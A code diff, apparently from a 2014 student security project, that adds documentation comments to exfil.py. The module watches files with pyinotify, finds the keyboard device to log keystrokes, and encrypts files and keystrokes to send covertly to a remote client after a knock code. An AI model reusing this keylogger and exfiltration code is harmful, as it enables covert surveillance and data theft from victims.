@@ -1,3 +1,30 @@
+"""
+/*---------------------------------------------------------------------------------------
+--  SOURCE FILE:    exfil.py
+--
+--  PROGRAM:        exfil
+--
+--  FUNCTIONS:       addWatch(target, address, proto)
+--					 sendMessage(string)
+--					 removeWatch(target)
+--					 sendFile(target)
+--					 exfilThread()
+--					 startThread()
+--					 startKeylogger(address, proto)
+--					 findKeyboard()
+--					 startKeylistener()
+--
+--  DATE:           December 7th, 2014
+--
+--  DESIGNERS:      Jacob Miner
+--
+--  PROGRAMMERS:    Jacob Miner
+--	
+--  NOTES:			The exfiltration module of the program
+--  
+---------------------------------------------------------------------------------------*/
+"""
+
 from evdev import InputDevice, categorize, ecodes, list_devices
 import pyinotify
 import socket
@@ -53,8 +80,30 @@ class EventHandler(pyinotify.ProcessEvent):
 mask = pyinotify.IN_DELETE | pyinotify.IN_CREATE
 handler = EventHandler()
 wama = pyinotify.WatchManager()
-noti = pyinotify.Notifier(wama, handler)	
+noti = pyinotify.Notifier(wama, handler)
 
+"""
+/*------------------------------------------------------------------------------
+--
+--  FUNCTION:   addWatch
+--
+--  DATE:       December 7th, 2014
+--
+--  DESIGNERS:  Jacob Miner  
+--
+--  PROGRAMMER: Jacob Miner 
+--
+--  INTERFACE:	addWatch(target, address, proto)
+--					target - the target to begin watching
+--					address - the address of the client 
+--					proto - the protocol to send the information over
+--
+--  RETURNS:  	void
+--
+--  NOTES:  	Adds a file or directory to begin watching for changes in
+--  
+------------------------------------------------------------------------------*/
+"""
 def addWatch(target, address, proto):
 	global client, protocol
 	client = address
@@ -63,6 +112,26 @@ def addWatch(target, address, proto):
 	if (wama.add_watch(target, mask, rec=True) > 0):
 		print "added: " + target
 
+"""
+/*------------------------------------------------------------------------------
+--
+--  FUNCTION:   sendMessage
+--
+--  DATE:       December 7th, 2014
+--
+--  DESIGNERS:  Jacob Miner  
+--
+--  PROGRAMMER: Jacob Miner 
+--
+--  INTERFACE:	sendMessage(string)
+--					string - the message to send to the client
+--
+--  RETURNS:  	void
+--
+--  NOTES:  	sends the knockCode to the client, encrypts the string, then
+--  			delivers the encrypted string to the client covertly
+------------------------------------------------------------------------------*/
+"""
 def sendMessage(string):
 	recvFunctions.knockCode(client, protocol, True)
 
@@ -73,10 +142,50 @@ def sendMessage(string):
 
 	recvFunctions.knockCode(client, protocol, False)
 
+"""
+/*------------------------------------------------------------------------------
+--
+--  FUNCTION:   removeWatch
+--
+--  DATE:       December 7th, 2014
+--
+--  DESIGNERS:  Jacob Miner  
+--
+--  PROGRAMMER: Jacob Miner 
+--
+--  INTERFACE:	removeWatch(target)
+--					target - the file or directory to stop watching
+--
+--  RETURNS:  	void
+--
+--  NOTES:  	removes a file or directory to begin watching for changes in
+--  
+------------------------------------------------------------------------------*/
+"""
 def removeWatch(target):
 	if (wama.rm_watch(wama.get_wd(target))):
 		print "removed: " + target
 
+"""
+/*------------------------------------------------------------------------------
+--
+--  FUNCTION:   sendFile
+--
+--  DATE:       December 7th, 2014
+--
+--  DESIGNERS:  Jacob Miner  
+--
+--  PROGRAMMER: Jacob Miner 
+--
+--  INTERFACE:	sendFile(target)
+--					target - the file to send to the client
+--
+--  RETURNS:  	void
+--
+--  NOTES:  	Sends the knockCode to the client, opens a file, encrypts the content,
+--  			then sends the content to the client covertly
+------------------------------------------------------------------------------*/
+"""
 def sendFile(target):
 	recvFunctions.knockCode(client, protocol, True)
 
@@ -91,14 +200,73 @@ def sendFile(target):
 
 	recvFunctions.knockCode(client, protocol, False)
 
+"""
+/*------------------------------------------------------------------------------
+--
+--  FUNCTION:   exfilThread
+--
+--  DATE:       December 7th, 2014
+--
+--  DESIGNERS:  Jacob Miner  
+--
+--  PROGRAMMER: Jacob Miner 
+--
+--  INTERFACE:	exfilThread()
+--
+--  RETURNS:  	void	
+--
+--  NOTES:  	wrapper function to begin the notification loop for watching files
+--  
+------------------------------------------------------------------------------*/
+"""
 def exfilThread():
 	noti.loop()
 
+"""
+/*------------------------------------------------------------------------------
+--
+--  FUNCTION:   startThread
+--
+--  DATE:       December 7th, 2014
+--
+--  DESIGNERS:  Jacob Miner  
+--
+--  PROGRAMMER: Jacob Miner 
+--
+--  INTERFACE:	startThread()
+--
+--  RETURNS:  	void
+--
+--  NOTES:  	starts the exfiltration thread
+--  
+------------------------------------------------------------------------------*/
+"""
 def startThread(): # address, protocol, password):
 	listenThread = threading.Thread(target=exfilThread)#, args=(address, protocol))
 	listenThread.daemon = True
 	listenThread.start()
 
+"""
+/*------------------------------------------------------------------------------
+--
+--  FUNCTION:   startKeylogger
+--
+--  DATE:       December 7th, 2014
+--
+--  DESIGNERS:  Jacob Miner  
+--
+--  PROGRAMMER: Jacob Miner 
+--
+--  INTERFACE:	startKeylogger(address, proto)
+--					address -	the client ip address
+--					prot -		the protocol to send keystrokes through
+--
+--  RETURNS:  	void
+--
+--  NOTES:  	starts the thread monitoring keystrokes
+--  
+------------------------------------------------------------------------------*/
+"""
 def startKeylogger(address, proto):
 	global logger
 	global logThread
@@ -114,12 +282,50 @@ def startKeylogger(address, proto):
 	else:
 		logger = False
 
+"""
+/*------------------------------------------------------------------------------
+--
+--  FUNCTION:   findKeyboard
+--
+--  DATE:       December 7th, 2014
+--
+--  DESIGNERS:  Jacob Miner  
+--
+--  PROGRAMMER: Jacob Miner 
+--
+--  INTERFACE:	findKeyboard()
+--
+--  RETURNS:  	string - the name and directory of the keyboard device 
+--
+--  NOTES:  	Finds the keyboard device in /dev and returns it
+--  
+------------------------------------------------------------------------------*/
+"""
 def findKeyboard():
 	devices = [InputDevice(fn) for fn in list_devices()]
 	for dev in devices:
 		if "keyboard" in dev.name.lower():
 			return dev.fn 
-
+			
+"""
+/*------------------------------------------------------------------------------
+--
+--  FUNCTION:   startKeylistener
+--
+--  DATE:       December 7th, 2014
+--
+--  DESIGNERS:  Jacob Miner  
+--
+--  PROGRAMMER: Jacob Miner 
+--
+--  INTERFACE:	startKeylistener()
+--
+--  RETURNS:  	void
+--
+--  NOTES:  	starts monitoring keyboard events, and sends them to the client
+--  
+------------------------------------------------------------------------------*/
+"""
 def startKeylistener():
 	global logger
 	dev = InputDevice(findKeyboard())
